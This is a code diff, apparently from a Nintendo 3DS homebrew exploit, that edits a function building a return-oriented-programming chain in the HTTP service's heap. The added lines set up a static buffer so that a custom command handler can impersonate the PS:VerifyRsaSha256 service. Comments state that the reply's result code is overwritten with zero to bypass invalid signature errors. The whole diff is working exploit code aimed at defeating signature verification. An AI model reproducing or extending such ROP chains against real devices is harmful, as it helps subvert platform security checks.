@@ -1312,6 +1312,17 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
 
+	//Setup the static buffer in tls. This (probably) doesn't really need to run *every* time this custom cmdhandler runs, but whatever. The original static buffer is too small for use with PS:VerifyRsaSha256. Hence, this custom cmdhandler needs to run at least once before being used as PS:VerifyRsaSha256.
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Setup the first static buffer translate header.
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x100-4);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x2 | (0x300 << 14), 0, 0);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Setup the first static buffer.
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x104-4);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_writeu32(&ropchain, &ropvaddr, ropheap+0x100, 0, 0);
+
 	/*
 	if(cmdhdr==0x18010082)
 	{
@@ -1473,7 +1484,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	{
 		memcpy(&cmdreply[2], &saved_cmdreq[12], 0x8);//Copy the translate descriptors + bufaddrs to the cmdreply.
 		cmdreply[0] = 0x00020042;//Write the cmdhdr just in case svcSendSyncRequest itself failed.
-		cmdreply[1] = 0x1;//Overwrite the resultcode to bypass invalid signature errors. 0x1 is for testing.
+		cmdreply[1] = 0x0;//Overwrite the resultcode to bypass invalid signature errors.
 	}
 	*/
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
@@ -1493,13 +1504,10 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		ropgen_movr1r0(&ropchain, &ropvaddr);
 		ropgen_writeu32(&ropchain, &ropvaddr, 0x00020042, 0, 0);
 
-		//cmdreply[1] = 0x1
-		ropgen_setr0(&ropchain, &ropvaddr, 0);
-		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
-
+		//cmdreply[1] = 0x0
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
 		ropgen_movr1r0(&ropchain, &ropvaddr);
-		ropgen_setr0(&ropchain, &ropvaddr, 0);
+		ropgen_setr0(&ropchain, &ropvaddr, 0x0);
 		ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
 
 	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
